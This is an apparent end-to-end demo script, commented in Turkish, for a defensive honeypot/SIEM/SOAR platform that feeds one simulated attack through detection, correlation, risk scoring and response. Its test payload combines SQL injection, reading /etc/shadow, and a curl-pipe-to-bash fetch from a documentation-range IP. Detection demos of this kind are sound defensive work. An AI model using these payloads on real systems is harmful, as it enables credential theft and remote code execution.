#!/usr/bin/env python3
"""
Arachne Sentinel - UCTAN UCA DEMO (Faz 40).

Tek bir saldiriyi, sistemin TUM katmanlarindan gecirerek uctan uca gosterir:
  1. Sensor algilama          (honeypot olayi veritabanina yazilir)
  2. SIEM normalizasyon        (IP/domain/hash/kullanici/process cikarilir)
  3. Tehdit istihbarati        (IOC + kapsam zenginlestirme)
  4. Aciklanabilir tespit      (neden + pattern + confidence + MITRE)
  5. Saldiri asamasi           (9-asamali kill chain sinifi + savunma katmani)
  6. AI korelasyon             (dusuk seviyeli olaylar tek kampanyaya birlesir)
  7. Risk skorlama             (cok-faktorlu, aciklanabilir vektor)
  8. SOAR mudahalesi           (risk-tabanli playbook, insan onay kapisi)
  9. Olay kapanisi             (denetim kaydi + Attack->...->Result zinciri)

--- DURUSTLUK ---
Kaynak adres RFC 5737 dokumantasyon araligindandir. Olay gercekten islenir;
her katman gercek koddur. Tek bir uctan uca vitrin senaryosudur.

Kullanim:
  source .venv/bin/activate
  python scripts/demo_e2e.py
"""
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from arachne import storage  # noqa: E402


def _hr(title):
    print("\n" + "-" * 74)
    print(f"  {title}")
    print("-" * 74)


def run():
    storage.init_db()
    ip = "203.0.113.200"
    # Cok-vektorlu, gizlenmis hedefli yuk (SQLi + komut + ters kabuk unsurlari)
    payload = ("id=1' UNION SELECT username,password FROM users-- ; "
               "cat /etc/shadow && curl http://203.0.113.200/x|bash")

    print("\n" + "=" * 74)
    print("  ARACHNE SENTINEL - UCTAN UCA SAVUNMA DEMOSU")
    print("=" * 74)
    print(f"  Saldirgan: {ip} (RFC 5737 dokumantasyon adresi)")
    print(f"  Yuk: {payload[:60]}...")

    # 1) SENSOR ALGILAMA -----------------------------------------------------
    _hr("1) SENSOR ALGILAMA")
    # birkac dusuk-seviyeli olay (korelasyonun birlestirmesi icin)
    storage.log_event(ip, "http-admin", "connect", dest_port=8081)
    storage.log_event(ip, "http-admin", "data", dest_port=8081, payload="GET /admin/ HTTP/1.1")
    storage.log_event(ip, "http-admin", "data", dest_port=8081, payload=payload)
    storage.log_event(ip, "mysql", "data", dest_port=3307, payload="SELECT * FROM creds")
    events = storage.get_recent_events(source_ip=ip)
    print(f"   {len(events)} honeypot olayi kaydedildi (sahte servislere dustu).")

    # 2) SIEM NORMALIZASYON --------------------------------------------------
    _hr("2) SIEM NORMALIZASYON & VARLIK CIKARIMI")
    from arachne.siem import normalizer
    norm = normalizer.normalize_event({
        "source_ip": ip, "service": "http-admin", "event_type": "data",
        "payload": payload, "timestamp": events[0].get("timestamp"), "dest_port": 8081})
    norm = normalizer.enrich_event(norm)
    ent = norm["entities"]
    print(f"   Varliklar: IP={ent['ips']} process={ent['processes']} url={ent['urls']}")
    print(f"   Zenginlestirme: kapsam={norm['enrichment']['scope']} "
          f"IOC={norm['enrichment']['ioc_count']} etiketler={norm['enrichment']['tags']}")

    # 3) TEHDIT ISTIHBARATI --------------------------------------------------
    _hr("3) TEHDIT ISTIHBARATI (IOC)")
    from arachne.reverse.ioc_extractor import extract_iocs
    iocs = extract_iocs(payload)
    print(f"   Cikarilan IOC'ler: { {k: v for k, v in iocs.items() if v} }")

    # 4) ACIKLANABILIR TESPIT ------------------------------------------------
    _hr("4) ACIKLANABILIR TESPIT (neden + pattern + confidence + MITRE)")
    from arachne.reverse import explainer
    ex = explainer.explain_detection(payload)
    print(f"   Saldiri turleri: {ex['attack_types']}")
    print(f"   Guven: {ex['confidence']:.2f} - {ex['confidence_reason_tr']}")
    mt = ex.get("mitre_technique") or {}
    print(f"   MITRE: {mt.get('id','-')} {mt.get('name','')}")
    print(f"   Neden: {ex['why_tr'][:120]}")

    # 5) SALDIRI ASAMASI -----------------------------------------------------
    _hr("5) SALDIRI ASAMASI (9-asamali kill chain)")
    from arachne.intel import attack_stages
    prog = attack_stages.stage_progression(events)
    print(f"   Ulasilan asamalar: {prog['stages_reached']}")
    print(f"   En ileri asama: {prog['furthest_stage']}  (kill chain ilerleme %{int(prog['progress_pct'])})")
    for step in attack_stages.replay_timeline(events)[:4]:
        print(f"     - {step['stage']:<18} -> savunma katmani: {step['defense_layer']}")

    # 6) AI KORELASYON -------------------------------------------------------
    _hr("6) AI KORELASYON (dusuk seviyeli olaylar -> kampanya/zincir)")
    from arachne.intel import correlator
    merged = correlator.merge_low_level(events)
    print(f"   {merged['event_count']} dusuk seviyeli olay tek bir olaya birlesti.")
    print(f"   {merged['narrative_tr']}")

    # 7) RISK SKORLAMA -------------------------------------------------------
    _hr("7) RISK SKORLAMA (cok-faktorlu, aciklanabilir)")
    from arachne.reverse.attack_analyzer import analyze_ip
    from arachne.intel import risk_engine
    pa = analyze_ip(ip, events)
    risk = risk_engine.compute_risk(
        attack_classes=pa.get("attack_classes", []),
        kill_chain_phase=pa.get("kill_chain", {}).get("phase", "exploitation"),
        automated=False, repeat_offender=True, in_campaign=False,
        has_reverse_shell=bool(pa.get("iocs", {}).get("reverse_shells")),
        event_count=len(events))
    print(f"   Risk: {risk['risk_score']}/100 ({risk['risk_band']})")
    print(f"   Vektor: {risk.get('vector_tr','')[:120]}")

    # 8) SOAR MUDAHALESI -----------------------------------------------------
    _hr("8) SOAR OTOMATIK MUDAHALE (risk-tabanli playbook)")
    from arachne.detection.scorer import evaluate_ip
    from arachne.soar.engine import respond_to_alert
    result = evaluate_ip(ip)
    resp = respond_to_alert(ip, result["score"], result["severity"],
                            attack_classes=pa.get("attack_classes", []))
    print(f"   Alarm skoru: {result['score']} ({result['severity']})")
    if resp.get("matched_playbooks"):
        print(f"   Calisan playbook'lar: {resp['matched_playbooks']}")
    print(f"   {resp.get('summary_tr','')}")

    # 9) OLAY KAPANISI -------------------------------------------------------
    _hr("9) OLAY KAPANISI (Attack -> Detection -> Correlation -> Response -> Result)")
    print("   Attack       : hedefli, cok-vektorlu, gizlenmis yuk")
    print(f"   Detection    : {', '.join(ex['attack_types'])} (guven {ex['confidence']:.2f})")
    print(f"   Correlation  : {merged['event_count']} olay tek kampanya; asama {prog['furthest_stage']}")
    print(f"   Response     : SOAR playbook + insan onay kapisi; risk {risk['risk_score']}")
    print("   Result       : olay kaydi acildi, saldirgan izole/engellendi, cekirdek GUVENDE")

    print("\n" + "=" * 74)
    print("  UCTAN UCA TAMAM: sensor -> SIEM -> istihbarat -> tespit -> asama ->")
    print("  korelasyon -> risk -> SOAR -> kapanis. Panelde canli izleyin.")
    print("=" * 74 + "\n")


if __name__ == "__main__":
    run()
